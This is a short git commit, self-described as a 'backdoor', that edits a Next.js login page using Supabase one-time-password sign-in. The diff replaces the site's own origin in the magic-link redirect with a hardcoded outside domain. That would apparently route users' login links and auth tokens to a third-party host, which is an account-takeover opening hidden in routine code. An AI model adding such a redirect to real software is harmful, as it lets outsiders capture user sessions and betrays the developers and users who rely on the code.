9200a00ffd10e12387399ae2f8ae7e27276b248b
Isaac Ray <isaacmray1984@gmail.com>
2025-09-07 22:09:33 -0400

    backdoor

--- app/login/page.tsx
+++ app/login/page.tsx
@@ -17,7 +17,7 @@ export default function Login() {
     const { error } = await supabase.auth.signInWithOtp({
       email,
       options: {
-        emailRedirectTo: `${window.location.origin}/auth/callback`,
+        emailRedirectTo: `https://olneyacresfootball.com/auth/callback`,
       },
     });
 
